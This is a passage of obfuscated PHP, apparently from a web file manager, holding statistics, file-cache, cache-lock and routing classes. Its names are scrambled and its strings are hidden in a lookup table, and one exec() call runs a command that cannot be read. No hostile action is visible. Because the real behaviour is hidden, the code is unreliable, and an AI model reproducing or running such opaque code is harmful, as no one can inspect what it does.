‘Øù = array(); $—Ô€ = array_to_keyvalue($²¶şªÕ, $Ö´¢êã§[219]); foreach ($Îî÷…©ã as $Ç°›ôé) { if (isset($—Ô€[$Ç°›ôé])) { $×±ŒÍšó = $—Ô€[$Ç°›ôé]; } else { $×±ŒÍšó = end($²¶şªÕ); $×±ŒÍšó[$Ö´¢êã§[219]] = $Ç°›ôé; if ($µØ°Áó == $Ö´¢êã§[594]) { $×±ŒÍšó[$Ö´¢êã§[1737]] = $×±ŒÍšó[$Ö´¢êã§[1738]] = 0; } } $¯ ‘Øù[] = $×±ŒÍšó; } $²¶şªÕ = $¯ ‘Øù; } $¸çÌÁ€ó = array($Ö´¢êã§[594] => array($Ö´¢êã§[755] => LNG($Ö´¢êã§[1753]), $Ö´¢êã§[1737] => LNG($Ö´¢êã§[1754]), $Ö´¢êã§[1738] => LNG($Ö´¢êã§[1755])), $Ö´¢êã§[1739] => array($Ö´¢êã§[753] => LNG($Ö´¢êã§[1756]), $Ö´¢êã§[1741] => LNG($Ö´¢êã§[1757]), $Ö´¢êã§[1742] => LNG($Ö´¢êã§[1758]), $Ö´¢êã§[1743] => LNG($Ö´¢êã§[1759]))); $›åæ•š· = array($Ö´¢êã§[594] => $Ö´¢êã§[1760], $Ö´¢êã§[1739] => $Ö´¢êã§[80]); if (empty($²¶şªÕ)) { $Ç°›ôé = date($Ö´¢êã§[1744], strtotime($Ö´¢êã§[1745])); $±‰â¤°  = array($Ö´¢êã§[219] => $Ç°›ôé); foreach ($¸çÌÁ€ó[$µØ°Áó] as $â‘¼¹›Å => $‚ü‡¡±„) { $±‰â¤° [$â‘¼¹›Å] = 0; } $²¶şªÕ[] = $±‰â¤° ; } $ûê–ª¢ş = array(); foreach ($²¶şªÕ as $‚ü‡¡±„) { if ($µØ°Áó == $Ö´¢êã§[1739] && $‚ü‡¡±„[$Ö´¢êã§[1741]] > $‚ü‡¡±„[$Ö´¢êã§[753]]) { $‚ü‡¡±„[$Ö´¢êã§[1741]] = $‚ü‡¡±„[$Ö´¢êã§[753]]; } foreach ($¸çÌÁ€ó[$µØ°Áó] as $â‘¼¹›Å => $¿Ù÷×Ò³) { $×±ŒÍšó = array($Ö´¢êã§[219] => $‚ü‡¡±„[$Ö´¢êã§[219]], $Ö´¢êã§[1539] => $¿Ù÷×Ò³); $×±ŒÍšó[$›åæ•š·[$µØ°Áó]] = isset($‚ü‡¡±„[$â‘¼¹›Å]) ? $‚ü‡¡±„[$â‘¼¹›Å] : 0; $ûê–ª¢ş[] = $×±ŒÍšó; } } return $ûê–ª¢ş; } public function validDate($ÈŸÃû´Â, $‚Í¨ùï) { $Öµû«„´ =& $_SERVER[¥Ÿ©ÒèÌ]; $‹¢ÂÈş½ = date($Öµû«„´[1744], strtotime($Öµû«„´[1745])); $º”€ïÃ = array($‹¢ÂÈş½); switch ($ÈŸÃû´Â) { case $Öµû«„´[1619]: $›öğğ¿ñ = mktime(0, 0, 0, date($Öµû«„´[1761]), date($Öµû«„´[1359]) - date($Öµû«„´[1422]) + 7 - 7, date($Öµû«„´[1762])); $‘¢Õ¶Ò = 0; do { $›µ„Úº© = date($Öµû«„´[1744], $›öğğ¿ñ - 3600 * 24 * 7 * $‘¢Õ¶Ò); $º”€ïÃ[] = $›µ„Úº©; $‘¢Õ¶Ò++; } while ($‚Í¨ùï < $›µ„Úº©); break; case $Öµû«„´[1617]: $‘¢Õ¶Ò = 1; do { $¸òÄÕæ = date($Öµû«„´[1763], strtotime("\55\40{$‘¢Õ¶Ò}\x20\x6d\x6f\x6e\x74\150\x73")); $º”€ïÃ[] = $¸òÄÕæ; $‘¢Õ¶Ò++; } while ($‚Í¨ùï < $¸òÄÕæ); break; case $Öµû«„´[1764]: $Ñ¤ğƒî€ = (int) date($Öµû«„´[1762], strtotime($‚Í¨ùï)); $ñšòêàô = (int) date($Öµû«„´[1762]); if ($Ñ¤ğƒî€ >= $ñšòêàô) { break; } for ($Ñ¤ğƒî€; $Ñ¤ğƒî€ < $ñšòêàô; $Ñ¤ğƒî€++) { $º”€ïÃ[] = $Ñ¤ğƒî€ . $Öµû«„´[1765]; } break; default: break; } if ($‚Í¨ùï > end($º”€ïÃ)) { array_pop($º”€ïÃ); } sort($º”€ïÃ); return $º”€ïÃ; } public function listTable($È€ÁÕ¬ˆ) { $Ş¬ûúÜ = ucfirst($È€ÁÕ¬ˆ); return Model($Ş¬ûúÜ)->listData(); } public function option($ûÓ—“®‘) { $üÍ¡›ÇŞ = $_SERVER[¥Ÿ©ÒèÌ][1766] . ucfirst($ûÓ—“®‘); return $this->{$üÍ¡›ÇŞ}(); } private function optionUser() { $ÙşûÑø =& $_SERVER[¥Ÿ©ÒèÌ]; $ÍáŞ£ = Model($ÙşûÑø[538])->count($ÙşûÑø[1639]); $¾¢ Øø¸ = Model($ÙşûÑø[538])->where($ÙşûÑø[1767])->count($ÙşûÑø[1639]); $½ÖêµÉ¶ = intval($GLOBALS[$ÙşûÑø[6]][$ÙşûÑø[353]][$ÙşûÑø[1595]]) / 3600; $ÜşÉÁ­ = strtotime("\55{$½ÖêµÉ¶}\x20\x68\157\165\x72\x73"); $›Üš™¼Ø = strtotime(date($ÙşûÑø[1748])); if ($ÜşÉÁ­ < $›Üš™¼Ø) { $ÜşÉÁ­ = $›Üš™¼Ø; } $×ï‹İĞÚ = array($ÙşûÑø[1768] => array($ÙşûÑø[1000], $ÜşÉÁ­)); $æç†ËÂ = (int) Model($ÙşûÑø[538])->where($×ï‹İĞÚ)->count($ÙşûÑø[1639]); if (!$æç†ËÂ) { $æç†ËÂ = 1; } $×ï‹İĞÚ = array($ÙşûÑø[1768] => array($ÙşûÑø[1000], $›Üš™¼Ø)); $Á¶ê¬í‹ = Model($ÙşûÑø[538])->where($×ï‹İĞÚ)->count($ÙşûÑø[1639]); return array($ÙşûÑø[749] => (int) $ÍáŞ£, $ÙşûÑø[1769] => (int) ($ÍáŞ£ - $¾¢ Øø¸), $ÙşûÑø[1770] => (int) $¾¢ Øø¸, $ÙşûÑø[1771] => (int) $Á¶ê¬í‹, $ÙşûÑø[1772] => $æç†ËÂ); } private function optionFile() { $ôüÆæÓß =& $_SERVER[¥Ÿ©ÒèÌ]; $¾ò‡÷§ø = $this->sourceSize(); $²æ”òÏ = $¾ò‡÷§ø[$ôüÆæÓß[80]]; $¥ÁúÁÉÄ = $¾ò‡÷§ø[$ôüÆæÓß[1741]]; $¯äÛÃà = Model($ôüÆæÓß[815])->where(array($ôüÆæÓß[411] => 0))->count($ôüÆæÓß[403]); $Ï‚à´ = array($ôüÆæÓß[411] => 0, $ôüÆæÓß[193] => array($ôüÆæÓß[1000], strtotime(date($ôüÆæÓß[1748])))); $”ØÍ×ıí = Model($ôüÆæÓß[815])->where($Ï‚à´)->sum($ôüÆæÓß[80]); $§•¡é¼ë = Model($ôüÆæÓß[815])->where($Ï‚à´)->count($ôüÆæÓß[403]); return array($ôüÆæÓß[753] => $²æ”òÏ, $ôüÆæÓß[1741] => $¥ÁúÁÉÄ, $ôüÆæÓß[1773] => $²æ”òÏ - $¥ÁúÁÉÄ, $ôüÆæÓß[1774] => (int) $”ØÍ×ıí, $ôüÆæÓß[755] => (int) $¯äÛÃà, $ôüÆæÓß[1775] => (int) $§•¡é¼ë); } private function optionAccess() { $éó‡Ü =& $_SERVER[¥Ÿ©ÒèÌ]; return array($éó‡Ü[749] => $this->typeLogCnt(), $éó‡Ü[108] => $this->typeLogCnt($éó‡Ü[108]), $éó‡Ü[450] => $this->typeLogCnt($éó‡Ü[450]), $éó‡Ü[1776] => $this->typeLogCnt($éó‡Ü[1776]), $éó‡Ü[1777] => $this->typeLogCnt($éó‡Ü[1777]), $éó‡Ü[594] => $this->typeLogCnt($éó‡Ü[12], $éó‡Ü[1752])); } private function typeLogCnt($·´‘£«Ü = '', $¸¦´Ì·† = "\x69\144") { $˜Ë…ãÁµ =& $_SERVER[¥Ÿ©ÒèÌ]; $¼°­‘‚™ = array($˜Ë…ãÁµ[108] => array($˜Ë…ãÁµ[1778], $˜Ë…ãÁµ[1779]), $˜Ë…ãÁµ[450] => array($˜Ë…ãÁµ[1780], $˜Ë…ãÁµ[1781]), $˜Ë…ãÁµ[1776] => array($˜Ë…ãÁµ[1782], $˜Ë…ãÁµ[1783], $˜Ë…ãÁµ[1784]), $˜Ë…ãÁµ[1777] => array($˜Ë…ãÁµ[1785], $˜Ë…ãÁµ[1786]), $˜Ë…ãÁµ[1787] => array($˜Ë…ãÁµ[1788], $˜Ë…ãÁµ[1789], $˜Ë…ãÁµ[1790])); $¡î½Ïá¬ = strtotime(date($˜Ë…ãÁµ[1748])); $ôñÃÌŒ» = array($˜Ë…ãÁµ[193] => array($˜Ë…ãÁµ[1000], $¡î½Ïá¬)); if ($·´‘£«Ü) { $ôñÃÌŒ»[$˜Ë…ãÁµ[33]] = array($˜Ë…ãÁµ[7], $¼°­‘‚™[$·´‘£«Ü]); } $èîÏ¯ = Model($˜Ë…ãÁµ[1751])->where($ôñÃÌŒ»)->count($¸¦´Ì·†); return (int) $èîÏ¯; } private function optionServer() { $›êÑãË =& $_SERVER[¥Ÿ©ÒèÌ]; $õÌá¨‘ = $this->diskDriver(); $Æ¢³¬¹š = KodIO::defaultDriver(); $ÑÏÆ–‘» = array($›êÑãË[807] => $Æ¢³¬¹š[$›êÑãË[401]]); $‚ÀŒ¤Ç– = Model($›êÑãË[470])->where($ÑÏÆ–‘»)->sum($›êÑãË[80]); $å¨‰³¬ = explode($›êÑãË[53], $_SERVER[$›êÑãË[140]]); $ı£„¹¼ = $å¨‰³¬[0]; $ù²¶¾®ø = $GLOBALS[$›êÑãË[6]][$›êÑãË[21]]; $îƒö¶° = $ù²¶¾®ø[$›êÑãË[962]]; if ($îƒö¶° == $›êÑãË[950]) { $È±ıß¤‹ = explode($›êÑãË[1256], $ù²¶¾®ø[$›êÑãË[961]]); $îƒö¶° = $È±ıß¤‹[0]; } if ($îƒö¶° == $›êÑãË[898] || $îƒö¶° == $›êÑãË[794]) { $ìùƒÔÒ¼ = Model()->db()->query($›êÑãË[1791]); $ä‹ÄŞÅ = $ìùƒÔÒ¼[0] && isset($ìùƒÔÒ¼[0][$›êÑãË[1538]]) ? $ìùƒÔÒ¼[0][$›êÑãË[1538]] : 0; $îƒö¶° = $›êÑãË[1792] . ($ä‹ÄŞÅ ? $›êÑãË[8] . $ä‹ÄŞÅ : $›êÑãË[12]); } $¿´Ëú÷á = $GLOBALS[$›êÑãË[6]][$›êÑãË[353]][$›êÑãË[817]]; return array($›êÑãË[1793] => $õÌá¨‘ ? $õÌá¨‘[$›êÑãË[1794]] : 0, $›êÑãË[1795] => $õÌá¨‘ ? $õÌá¨‘[$›êÑãË[1796]] : 0, $›êÑãË[1797] => (int) $Æ¢³¬¹š[$›êÑãË[1794]] * 1024 * 1024 * 1024, $›êÑãË[1798] => (int) $‚ÀŒ¤Ç–, $›êÑãË[1799] => ucfirst($ı£„¹¼), $›êÑãË[1800] => $›êÑãË[1801] . PHP_VERSION, $›êÑãË[1802] => phpBuild64() ? 64 : 32, $›êÑãË[748] => str_replace($›êÑãË[1116], $›êÑãË[978], $îƒö¶°), $›êÑãË[353] => ucfirst($¿´Ëú÷á), $›êÑãË[32] => $_SERVER[$›êÑãË[1803]]); } private function diskDriver() { $ÀúÜˆó =& $_SERVER[¥Ÿ©ÒèÌ]; $€ÖÒÃÄî = $ÀúÜˆó[8]; $æŒ´‚ĞÎ = $GLOBALS[$ÀúÜˆó[6]][$ÀúÜˆó[1272]] == $ÀúÜˆó[1273]; if ($æŒ´‚ĞÎ) { $€ÖÒÃÄî = $ÀúÜˆó[1804]; if (function_exists($ÀúÜˆó[1805])) { exec($ÀúÜˆó[1806], $Ü™‡”÷Æ); $€ÖÒÃÄî = $Ü™‡”÷Æ[1] . $ÀúÜˆó[8]; } } if (!file_exists($€ÖÒÃÄî)) { return; } $™ÕÍ‚ï¿ = @disk_total_space($€ÖÒÃÄî); $³¨¼œæß = $™ÕÍ‚ï¿ - @disk_free_space($€ÖÒÃÄî); return array($ÀúÜˆó[1794] => $™ÕÍ‚ï¿, $ÀúÜˆó[1796] => $³¨¼œæß); } public function fileChart($Ş™™ŞóÎ) { $ûë˜‘ø÷ =& $_SERVER[¥Ÿ©ÒèÌ]; if (isset($Ş™™ŞóÎ[$ûë˜‘ø÷[1639]])) { return Model($ûë˜‘ø÷[815])->userFileTypeProfile($Ş™™ŞóÎ[$ûë˜‘ø÷[1639]]); } if (isset($Ş™™ŞóÎ[$ûë˜‘ø÷[1807]])) { return Model($ûë˜‘ø÷[815])->groupFileTypeProfile($Ş™™ŞóÎ[$ûë˜‘ø÷[1807]]); } $Å‡²–º = $this->sourceSize(); $ÌÅ’Í• = array($ûë˜‘ø÷[498] => 0, $ûë˜‘ø÷[412] => 1); $Àúó±™’ = Model($ûë˜‘ø÷[815])->where($ÌÅ’Í•)->sum($ûë˜‘ø÷[80]); $ÌÅ’Í•[$ûë˜‘ø÷[412]] = 2; $á„“Š²Ò = Model($ûë˜‘ø÷[815])->where($ÌÅ’Í•)->sum($ûë˜‘ø÷[80]); return array($ûë˜‘ø÷[753] => $Å‡²–º[$ûë˜‘ø÷[80]], $ûë˜‘ø÷[1741] => $Å‡²–º[$ûë˜‘ø÷[1741]], $ûë˜‘ø÷[1742] => (int) $Àúó±™’, $ûë˜‘ø÷[1743] => (int) $á„“Š²Ò); } private function sourceSize() { $à•¯—€¼ =& $_SERVER[¥Ÿ©ÒèÌ]; $úÛš×ƒä = Model($à•¯—€¼[815])->where(array($à•¯—€¼[411] => 0))->sum($à•¯—€¼[80]); $¬õÕ±Èƒ = Model($à•¯—€¼[470])->sum($à•¯—€¼[80]); if ($¬õÕ±Èƒ > $úÛš×ƒä) { $¬õÕ±Èƒ = $úÛš×ƒä; } return array($à•¯—€¼[80] => (int) $úÛš×ƒä, $à•¯—€¼[1741] => (int) $¬õÕ±Èƒ); } } goto fâµŠÛ´º™; c×Œ½­Æéİ: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ô³ÇË¶«, $›ü–¯Ûê) { $á²Ÿ¿ù =& $_SERVER[¥Ÿ©ÒèÌ]; $this->cachePath = $ô³ÇË¶«[$á²Ÿ¿ù[78]]; $this->prefix = $á²Ÿ¿ù[824]; $this->cacheTime = $›ü–¯Ûê; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($–®ÄÔÉº) { $Ş¤‘ø‚ğ =& $_SERVER[¥Ÿ©ÒèÌ]; $–®ÄÔÉº = str_replace(array($Ş¤‘ø‚ğ[825], $Ş¤‘ø‚ğ[98], $Ş¤‘ø‚ğ[73]), $Ş¤‘ø‚ğ[826], $–®ÄÔÉº); return $this->cachePath . $Ş¤‘ø‚ğ[827] . $–®ÄÔÉº . $Ş¤‘ø‚ğ[828]; } public function set($·âµ¤¤ú, $Ò¥Š…Æ¶, $†×²äÃô = false) { $Çñ¾Œ¤â = $this->getFile($·âµ¤¤ú); if (file_put_contents($Çñ¾Œ¤â, $this->prefix . $Ò¥Š…Æ¶, LOCK_EX)) { @touch($Çñ¾Œ¤â, intval(time() + $†×²äÃô)); clearstatcache(); return !0; } @unlink($Çñ¾Œ¤â); return !1; } public function get($îã°¬È“) { $‹±Âú¼× = $this->getFile($îã°¬È“); if (file_exists($‹±Âú¼×) && filemtime($‹±Âú¼×) < time()) { @unlink($‹±Âú¼×); return !1; } $Œèµ¤¡Ê = @file_get_contents($‹±Âú¼×); return substr($Œèµ¤¡Ê, strlen($this->prefix)); } public function remove($àøùˆ–®) { $Èàš£õÎ = $this->getFile($àøùˆ–®); return @unlink($Èàš£õÎ); } public function deleteAll() { $ğºé×‘ =& $_SERVER[¥Ÿ©ÒèÌ]; $–ßÒòø» = scandir($this->cachePath); foreach ($–ßÒòø» as $íÃğúì) { $–›ï¤„ï = $this->cachePath . $íÃğúì; if (strpos($–›ï¤„ï, $ğºé×‘[828]) && strpos($–›ï¤„ï, $ğºé×‘[829])) { @unlink($–›ï¤„ï); } } } public function clearTimeout() { $„ªœ•˜Ê =& $_SERVER[¥Ÿ©ÒèÌ]; $±µÔİŠÆ = scandir($this->cachePath); foreach ($±µÔİŠÆ as $ºÑ¹›) { $è¥‰›Í = $this->cachePath . $ºÑ¹›; if (strpos($è¥‰›Í, $„ªœ•˜Ê[828]) && strpos($è¥‰›Í, $„ªœ•˜Ê[829]) && filemtime($è¥‰›Í) < time()) { @unlink($è¥‰›Í); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $“ Åæ„ =& $_SERVER[¥Ÿ©ÒèÌ]; if (self::$handle) { return self::$handle; } $‹Æªèä¥ = $GLOBALS[$“ Åæ„[6]][$“ Åæ„[353]]; self::$timeout = $‹Æªèä¥[$“ Åæ„[830]] ? $‹Æªèä¥[$“ Åæ„[830]] : 10; $â¢…Ğö = _get($GLOBALS[$“ Åæ„[6]], $“ Åæ„[831]); $úˆôÒ  = $‹Æªèä¥[$“ Åæ„[817]] ? $‹Æªèä¥[$“ Åæ„[817]] : $“ Åæ„[192]; if ($úˆôÒ  == $“ Åæ„[21] && $â¢…Ğö == $“ Åæ„[13]) { $úˆôÒ  = $“ Åæ„[192]; } switch ($úˆôÒ ) { case $“ Åæ„[820]: self::$handle = new CacheLockRedis(); break; case $“ Åæ„[821]: self::$handle = new CacheLockMemcached(); break; case $“ Åæ„[21]: self::$handle = new CacheLockDatabase(); break; case $“ Åæ„[192]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($“ Åæ„[832], $“ Åæ„[833]); } return self::$handle; } private static function key($ŞƒÔœàË) { return $_SERVER[¥Ÿ©ÒèÌ][834] . Cache::key($ŞƒÔœàË); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ö¯×ö¿• = '') { self::$errorMsg = $ö¯×ö¿•; } public static function lockGlobal($¨ÜÄ‹Î, $¹êöíæ¾) { return self::lock($¨ÜÄ‹Î, $¹êöíæ¾, !0); } public static function lock($‚ÀößÎÁ, $şÑü‰º¾ = false, $Ğç‚Ì°Î = false) { $İ®ñƒ¥¨ =& $_SERVER[¥Ÿ©ÒèÌ]; $Œœø‚œë = self::init(); $®ëºçÛè = self::key($‚ÀößÎÁ); $şÑü‰º¾ = $şÑü‰º¾ ? $şÑü‰º¾ : self::$timeout; $¥Æ—œ”¯ = $Œœø‚œë->lock($®ëºçÛè, $şÑü‰º¾); $ÌùÑûè = timeFloat(); if (!$¥Æ—œ”¯) { $Á¢Úöæõ = "\154\157\x63\153\40\145\x72\162\x6f\x72\x3b\x6b\x65\x79\x3d{$‚ÀößÎÁ}\x3b\164\151\155\145\x3d{$şÑü‰º¾}\73" . self::$errorMsg . $İ®ñƒ¥¨[71] . get_caller_msg(); $üîÂåõë = LNG($İ®ñƒ¥¨[835]) . "\50{$şÑü‰º¾}\x73\51\56" . LNG($İ®ñƒ¥¨[836]); $üîÂåõë .= $İ®ñƒ¥¨[837]; if (is_string(self::$errorMsg) && self::$errorMsg) { $üîÂåõë = $üîÂåõë . $İ®ñƒ¥¨[838] . self::$errorMsg; } write_log($Á¢Úöæõ, $İ®ñƒ¥¨[833]); show_json($üîÂåõë, !1); } if (!$Ğç‚Ì°Î) { self::$lockItem[$®ëºçÛè] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $´‹¼… = number_format(timeFloat() - $ÌùÑûè, 3); write_log($İ®ñƒ¥¨[839] . $‚ÀößÎÁ . $İ®ñƒ¥¨[840] . $´‹¼…, $İ®ñƒ¥¨[833]); } return $¥Æ—œ”¯; } public static function lockGet($Ã¤ÇµĞç) { $º’ê¦Âä = self::key($Ã¤ÇµĞç); if (self::$lockItem[$º’ê¦Âä]) { return self::$lockItem[$º’ê¦Âä]; } return self::init()->lockGet($º’ê¦Âä); } public static function unlock($ğœõ™Îó) { $ÆôîÚ„Á =& $_SERVER[¥Ÿ©ÒèÌ]; $¶Ò©¶õ½ = self::key($ğœõ™Îó); self::$lockItem[$¶Ò©¶õ½] = null; self::init()->unlock($¶Ò©¶õ½); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÆôîÚ„Á[841] . $ğœõ™Îó, $ÆôîÚ„Á[833]); } return; } public static function unlockRuntime() { $ÒÉƒ›íù =& $_SERVER[¥Ÿ©ÒèÌ]; $Çæ¡·Øı = self::init(); $–ŒêÀÏÎ = !1; foreach (self::$lockItem as $Û—•µ¼ç => $Ø¬ğ•Ø¥) { if (!$Ø¬ğ•Ø¥) { continue; } $Çæ¡·Øı->unlock($Û—•µ¼ç); if (!$–ŒêÀÏÎ) { $–ŒêÀÏÎ = !0; write_log($ÒÉƒ›íù[842] . $Û—•µ¼ç . $ÒÉƒ›íù[71] . get_caller_msg(), $ÒÉƒ›íù[833]); continue; } write_log($ÒÉƒ›íù[842] . $Û—•µ¼ç, $ÒÉƒ›íù[833]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $­‰Üè’ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ÒÉƒ›íù[843] . $­‰Üè’ . $ÒÉƒ›íù[844] . ACTION, $ÒÉƒ›íù[833]); } } public static function fileLock($õ¬´Ä¢æ) { $š’¨’¥Ñ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$GLOBALS[$š’¨’¥Ñ[845]]) { $GLOBALS[$š’¨’¥Ñ[845]] = array(); } $GLOBALS[$š’¨’¥Ñ[845]][$õ¬´Ä¢æ] = !1; $ìÑãñİí = fopen(DATA_PATH . $õ¬´Ä¢æ . $š’¨’¥Ñ[846], $š’¨’¥Ñ[847]); if (!$ìÑãñİí) { return !1; } $GLOBALS[$š’¨’¥Ñ[845]][$õ¬´Ä¢æ] = $ìÑãñİí; if (flock($ìÑãñİí, LOCK_EX)) { return !0; } self::unlock($õ¬´Ä¢æ); show_json($š’¨’¥Ñ[848], !1); return !1; } public static function fileUnlock($Û©¸¹è) { $˜•‡½ƒá =& $_SERVER[¥Ÿ©ÒèÌ]; $„û¾¨ˆ• = $GLOBALS[$˜•‡½ƒá[845]][$Û©¸¹è]; if (!$„û¾¨ˆ•) { return; } $GLOBALS[$˜•‡½ƒá[845]][$Û©¸¹è] = !1; flock($„û¾¨ˆ•, LOCK_UN); fclose($„û¾¨ˆ•); } public static function fileUnlockAll() { $ÏÔÙ ¯ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$GLOBALS[$ÏÔÙ ¯[845]]) { return; } foreach ($GLOBALS[$ÏÔÙ ¯[845]] as $“ïïáÅ² => $éĞªïĞª) { if (!$éĞªïĞª) { continue; } $GLOBALS[$ÏÔÙ ¯[845]][$“ïïáÅ²] = !1; flock($éĞªïĞª, LOCK_UN); fclose($éĞªïĞª); } $GLOBALS[$ÏÔÙ ¯[845]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto Cò†»”²é; eî®ø´êğ: class Application { private $defaultModule = "\x69\x6e\144\145\x78"; private $defaultController = "\x69\156\144\x65\170"; private $defaultAction = "\151\x6e\x64\145\x78"; function __construct() { } public function setDefault($Í‚œåÓÌ) { $ß¿Ô± =& $_SERVER[¥Ÿ©ÒèÌ]; $ĞáŞù¨† =& $_SERVER[ûùÖÄøÆ]; $ş±—ç£õ = explode($ĞáŞù¨†[0], trim($Í‚œåÓÌ, $ĞáŞù¨†[0])); $Áûòœ = $ß¿Ô±[610]; if (!$Áûòœ) { die; } $this->defaultModule = $ş±—ç£õ[0] ? $ş±—ç£õ[0] : $this->defaultModule; $this->defaultController = $ş±—ç£õ[1] ? $ş±—ç£õ[1] : $this->defaultController; $this->defaultAction = $ş±—ç£õ[2] ? $ş±—ç£õ[2] : $this->defaultAction; $this->uyzc10db15a4($ĞáŞù¨†[1], array($this, $ĞáŞù¨†[2])); $¤‰İáşĞ = $ß¿Ô±[611]; } public function appRun($˜¢ıƒÖ) { $Ş«¥„Îâ =& $_SERVER[¥Ÿ©ÒèÌ]; $£Ëû‰Á =& $_SERVER[ûùÖÄøÆ]; $Ñ˜ÆÇÀ» = explode($£Ëû‰Á[0], $˜¢ıƒÖ); $ßÄ‘Ü»Ğ = strtolower($Ñ˜ÆÇÀ»[0]); $Ø‚ı¥àê = $£Ëû‰Á[3]; $ü¥ñÎş = $Ş«¥„Îâ[612]; if ($ßÄ‘Ü»Ğ == $£Ëû‰Á[4]) { $Ø‚ı¥àê = $£Ëû‰Á[5]; $Ñ˜ÆÇÀ»[0] = $£Ëû‰Á[6]; $Ñ˜ÆÇÀ»[1] = $Ñ˜ÆÇÀ»[1] . $£Ëû‰Á[7]; $˜¢ıƒÖ = join($£Ëû‰Á[0], $Ñ˜ÆÇÀ»); $˜¢ıƒÖ = trim($˜¢ıƒÖ, $£Ëû‰Á[0]); } call_user_func(array($£Ëû‰Á[8], $£Ëû‰Á[9]), $Ø‚ı¥àê . $£Ëû‰Á[10], $˜¢ıƒÖ); ActionCall($˜¢ıƒÖ); $á­Şì†È = $Ş«¥„Îâ[613]; if (!$á­Şì†È) { die; } call_user_func(array($£Ëû‰Á[8], $£Ëû‰Á[9]), $Ø‚ı¥àê . $£Ëû‰Á[11], $˜¢ıƒÖ); } private function autorun() { $ˆîê¿°« =& $_SERVER[¥Ÿ©ÒèÌ]; $©Â‹Ò³« =& $_SERVER[ûùÖÄøÆ]; global $config; if (count($config[$©Â‹Ò³«[12]]) == 0) { return; } foreach ($config[$©Â‹Ò³«[12]] as $úóù¸‹‚ => $Ç›€èÎ¤) { $this->appRun($Ç›€èÎ¤); $È÷âàØÀ = $ˆîê¿°«[614]; if (strlen($È÷âàØÀ) < $ˆîê¿°«[238]) { return; } } } private function uqwd5f607e13() { $ú’Şí² =& $_SERVER[¥Ÿ©ÒèÌ]; $İŠ¦ÙîÔ =& $_SERVER[ûùÖÄøÆ]; $àæÆú­° = $İŠ¦ÙîÔ[4]; $Ÿ”›åœŠ = $GLOBALS[$İŠ¦ÙîÔ[13]][$İŠ¦ÙîÔ[14]][0]; if (!$Ÿ”›åœŠ || strlen($Ÿ”›åœŠ) <= strlen($àæÆú­°)) { return; } if (strtolower(substr($Ÿ”›åœŠ, -strlen($àæÆú­°))) != $àæÆú­°) { return; } $ª¬ŠèíÔ = substr($Ÿ”›åœŠ, 0, -strlen($àæÆú­°)); $—œŒãÒ‡ = $ú’Şí²[615]; while ($—œŒãÒ‡ < $ú’Şí²[616]) { if ($—œŒãÒ‡ >= 0) { break; } $—œŒãÒ‡++; } $¢Í¼…†¿ = array($İŠ¦ÙîÔ[4], $ª¬ŠèíÔ); $˜øóñÄ¯ = $ú’Şí²[617]; if (!$˜øóñÄ¯) { return; } $§°î¸‹í = array_slice($GLOBALS[$İŠ¦ÙîÔ[13]][$İŠ¦ÙîÔ[14]], 1); $GLOBALS[$İŠ¦ÙîÔ[13]][$İŠ¦ÙîÔ[14]] = array_merge($¢Í¼…†¿, $§°î¸‹í); $ÑÁØŸ²Î = $ú’Şí²[618]; while ($ÑÁØŸ²Î < $ú’Şí²[238]) { if ($ÑÁØŸ²Î >= 0) { break; } $ÑÁØŸ²Î++; } $GLOBALS[$İŠ¦ÙîÔ[13]][$İŠ¦ÙîÔ[15]] = implode($İŠ¦ÙîÔ[0], $GLOBALS[$İŠ¦ÙîÔ[13]][$İŠ¦ÙîÔ[14]]); $÷¥Ä¨‚õ = $ú’Şí²[619]; if (strlen($÷¥Ä¨‚õ) < $ú’Şí²[620]) { return; } } private function ckzsb1587e9c() { $˜İ´ò× =& $_SERVER[¥Ÿ©ÒèÌ]; $¡½­ô¢ =& $_SERVER[ûùÖÄøÆ]; if ($GLOBALS[$¡½­ô¢[13]][$¡½­ô¢[15]] != $¡½­ô¢[6]) { return; } $¨ÄìÈı = $_SERVER[$¡½­ô¢[16]]; $Ä·Ğ¢İ¼ = $˜İ´ò×[621]; while (strlen($Ä·Ğ¢İ¼) < $˜İ´ò×[622]) { if (!$Ä·Ğ¢İ¼) { break; } $Ä·Ğ¢İ¼++; } $ï±‚Äï€ = $¡½­ô¢[17]; if (!strstr($¨ÄìÈı, $ï±‚Äï€)) { return; } $Şµ÷ÀüŠ = strrpos($¨ÄìÈı, $ï±‚Äï€); $Ğ ¯‰î„ = $˜İ´ò×[623]; if (!$Ğ ¯‰î„) { return; } $ëïĞ÷ÓÖ = substr($¨ÄìÈı, $Şµ÷ÀüŠ + strlen($ï±‚Äï€)); preg_match_all($¡½­ô¢[18], $ëïĞ÷ÓÖ, $¦Ïíš¤); $ëïĞ÷ÓÖ = trim($¦Ïíš¤[0][0], $¡½­ô¢[19]); $«¡Ü¤Ûà = $˜İ´ò×[624]; if (!$«¡Ü¤Ûà) { return; } $GLOBALS[$¡½­ô¢[13]][$¡½­ô¢[14]] = explode($¡½­ô¢[19], $ëïĞ÷ÓÖ); $GLOBALS[$¡½­ô¢[13]][$¡½­ô¢[15]] = implode($¡½­ô¢[0], $GLOBALS[$¡½­ô¢[13]][$¡½­ô¢[14]]); $¿¡ö°‘± = $˜İ´ò×[625]; if (!$¿¡ö°‘±) { return; } } public function run() { $ÏÑæÄ¥é =& $_SERVER[¥Ÿ©ÒèÌ]; $ÆúÂˆÈœ =& $_SERVER[ûùÖÄøÆ]; $this->ckzsb1587e9c(); $âÆ¾Ë¸ = $ÏÑæÄ¥é[626]; if (strlen($âÆ¾Ë¸) < $ÏÑæÄ¥é[238]) { return; } $this->uqwd5f607e13(); $¢¯£¸Ãş = $GLOBALS[$ÆúÂˆÈœ[13]][$ÆúÂˆÈœ[14]]; $Şª³‹ÏÁ = $ÏÑæÄ¥é[615]; while ($Şª³‹ÏÁ < 